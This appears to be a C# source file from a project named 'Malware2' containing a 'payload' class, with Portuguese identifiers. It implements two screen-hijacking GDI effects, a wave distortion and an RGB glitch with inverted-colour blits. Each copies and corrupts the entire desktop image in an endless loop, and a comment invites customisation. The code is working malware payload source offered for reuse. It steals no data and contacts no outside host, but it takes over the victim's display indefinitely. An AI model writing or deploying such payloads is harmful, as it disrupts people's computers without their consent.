using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Malware2
{
    public class SpecialCarga3
    {
        static int w = Screen.PrimaryScreen.Bounds.Width;
        static int h = Screen.PrimaryScreen.Bounds.Height;

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateDIBSection(IntPtr hdc, ref BITMAPINFO pbmi, uint pila, out IntPtr ppvBits, IntPtr hSection, uint dwOffset);

        [DllImport("gdi32.dll")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, uint rop);

        [DllImport("gdi32.dll")]
        static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, uint rop);

        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hwnd);

        [DllImport("user32.dll")]
        static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

        [DllImport("gdi32.dll")]
        static extern bool DeleteDC(IntPtr hdc);

        const uint SRCCOPY = 0x00CC0020;
        const uint BI_RGB = 0;

        public static void PiscaPisca()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr dcCopy = CreateCompatibleDC(hdc);

            try
            {
                int ws = w / 16;
                int hs = h / 16;

                BITMAPINFO bmi = new BITMAPINFO();
                bmi.biSize = Marshal.SizeOf(bmi);
                bmi.biWidth = ws;
                bmi.biHeight = -hs;
                bmi.biPlanes = 1;
                bmi.biBitCount = 32;
                bmi.biCompression = (int)BI_RGB;

                IntPtr ppvBits;
                IntPtr hbmp = CreateDIBSection(hdc, ref bmi, BI_RGB, out ppvBits, IntPtr.Zero, 0);
                IntPtr oldBmp = SelectObject(dcCopy, hbmp);

                Random rand = new Random();
                int offset = 0;

                while (true)
                {
                    using (Graphics g = Graphics.FromHdc(dcCopy))
                    {
                        g.Clear(Color.FromArgb(173, 216, 230)); // COLORS
                    }

                    // Copy the current screen to the DC
                    BitBlt(dcCopy, 0, 0, ws, hs, hdc, 0, 0, SRCCOPY);

                    unsafe
                    {
                        RGBQUAD* rgbquad = (RGBQUAD*)ppvBits.ToPointer();

                        for (int x = 0; x < ws; x++)
                        {
                            for (int y = 0; y < hs; y++)
                            {
                                int index = y * ws + x;

                                int wave = (int)(400 * Math.Sin((x + offset) / 5.0) * Math.Cos(y / 5.0)); // PERSONALIZE AQUI!!

                                rgbquad[index].rgbRed = (byte)((rgbquad[index].rgbRed + wave) % 256);
                                rgbquad[index].rgbGreen = (byte)((rgbquad[index].rgbGreen + wave) % 256);
                                rgbquad[index].rgbBlue = (byte)((rgbquad[index].rgbBlue + wave) % 256);
                            }
                        }
                    }

                    // Update the screen with the distorted image
                    StretchBlt(hdc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

                    offset++;
                    if (offset >= ws) offset = 0;

                    Thread.Sleep(30);
                }
            }
            finally
            {
                DeleteDC(dcCopy);
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        struct BITMAPINFO
        {
            public int biSize;
            public int biWidth;
            public int biHeight;
            public short biPlanes;
            public short biBitCount;
            public int biCompression;
            public int biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public int biClrUsed;
            public int biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct RGBQUAD
        {
            public byte rgbBlue;
            public byte rgbGreen;
            public byte rgbRed;
            public byte rgbReserved;
        }


        [DllImport("gdi32.dll")]
        static extern bool SetStretchBltMode(IntPtr hdc, int mode);

        const int COLORONCOLOR = 3;

        public static void TelaBugadaRgb()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr hdcCopy = CreateCompatibleDC(hdc);
            IntPtr oldBmp = IntPtr.Zero; // Declaração da variável fora do bloco try

            try
            {
                BITMAPINFO bmi = new BITMAPINFO();
                bmi.biSize = Marshal.SizeOf(bmi);
                bmi.biWidth = w;
                bmi.biHeight = -h;
                bmi.biPlanes = 1;
                bmi.biBitCount = 32;
                bmi.biCompression = (int)BI_RGB;

                IntPtr ppvBits;
                IntPtr hbmp = CreateDIBSection(hdc, ref bmi, BI_RGB, out ppvBits, IntPtr.Zero, 0);
                oldBmp = SelectObject(hdcCopy, hbmp); // Atribuição dentro do try

                Random rand = new Random();
                int i = 100;
                int j = 4;

                while (true)
                {
                    SetStretchBltMode(hdc, COLORONCOLOR);
                    SetStretchBltMode(hdcCopy, COLORONCOLOR);

                    StretchBlt(hdcCopy, rand.Next(3), rand.Next(3), w / j, h / j, hdc, rand.Next(3), rand.Next(3), w, h, SRCCOPY);

                    int k = rand.Next(15);

                    unsafe
                    {
                        byte* rgbquad = (byte*)ppvBits.ToPointer();

                        for (int x = 0; x < w; x++)
                        {
                            for (int y = 0; y < h; y++)
                            {
                                int index = (y * w + x) * 4; // Índice para cada componente RGBA

                                if (k < 5)
                                {
                                    rgbquad[index + 2] = (byte)Math.Min(255, rgbquad[index + 2] + rand.Next(i + 1)); // Red
                                }
                                else if (k >= 5 && k <= 10)
                                {
                                    rgbquad[index + 1] = (byte)Math.Min(255, rgbquad[index + 1] + rand.Next(i + 1)); // Green
                                }
                                else if (k > 10 && k <= 15)
                                {
                                    rgbquad[index] = (byte)Math.Min(255, rgbquad[index] + rand.Next(i + 1)); // Blue
                                }
                            }
                        }
                    }

                    i++;

                    StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w / j, h / j, SRCCOPY);

                    Thread.Sleep(1);
                    LimparTela();

                    if (rand.Next(25) == 24)
                    {
                        StretchBlt(hdc, 200, 200, w - 400, h - 400, hdc, 0, 0, w, h, SRCCOPY);
                        StretchBlt(hdc, 200, 200, w - 400, h - 400, hdc, 0, 0, w, h, 0x00EE0086);
                        StretchBlt(hdc, 200, 200, w - 400, h - 400, hdc, 0, 0, w, h, SRCCOPY);
                    }
                }
            }
            finally
            {
                SelectObject(hdcCopy, oldBmp);
                DeleteDC(hdcCopy);
                ReleaseDC(IntPtr.Zero, hdc);
            }
        }

        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        public static void LimparTela()
        {
            for (int num = 0; num < 10; num++)
            {
                InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                Thread.Sleep(10);
            }
        }
    }
}
